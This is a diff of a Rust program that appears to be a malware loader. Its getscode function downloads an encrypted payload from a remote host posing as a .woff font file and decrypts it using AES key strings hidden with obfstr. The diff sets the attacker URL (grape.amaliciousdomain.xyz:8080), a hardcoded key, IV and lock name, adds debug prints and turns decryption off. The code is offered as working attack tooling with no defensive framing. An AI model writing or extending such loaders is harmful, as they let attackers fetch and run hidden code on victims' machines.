@@ -9,14 +9,15 @@ use named_lock::Result;
 
 type Aes256CbcDec = cbc::Decryptor<aes::Aes128>;
 
-const URL: &str = "http://URL_REPLACE_ME/test.woff";
+const URL: &str = "http://grape.amaliciousdomain.xyz:8080/test.woff";
 
-const AESKEY: &str = "AES_KEY_REPLACE_ME";
-const AESIV: &str  = "AES_IV_REPLACE_ME";
+const AESKEY: &str = "dZ5q3dpluLhWRaKW";
+const AESIV: &str  = "1oMP8BCaEbmTHj3F";
 
-const LOCKNAME: &str = "RLOCK";
+const LOCKNAME: &str = "3rBoOnIoREnE";
 
 fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
+    println!("starting decrypt");
     let mut key = [0x42; 16];
     let mut iv = [0x24; 16];
     for (i, b) in obfstr::obfstr!(AESKEY).as_bytes().iter().enumerate() {
@@ -25,10 +26,13 @@ fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
     for (i, b) in obfstr::obfstr!(AESIV).as_bytes().iter().enumerate() {
         iv[i] = *b;
     }
+    println!("done w/ keys");
     let mut buf: Vec<u8> = Vec::with_capacity(size);
+    println!("created the buffer");
     let _pt = Aes256CbcDec::new(&key.into(), &iv.into())
         .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buf)
         .unwrap();
+    println!("decyprted");
     return buf;
 }
 
@@ -48,8 +52,12 @@ fn getscode(url: &str) -> Bytes {
     };
     // note, skip the first 16 bytes since they are the IV, might want to remove the IV from being in code and 
     // add it to the decypt function
-    let pt = decrypt(&rbytes[16..], rbytes.len());
-    let ptb = Bytes::from(pt);
+    //let pt = decrypt(&rbytes[16..], rbytes.len());
+    //let ptb = Bytes::from(pt);
+
+    // we're ignoring decryption for the moment
+    let ptb = Bytes::from(rbytes);
+
     return ptb;
 }
 
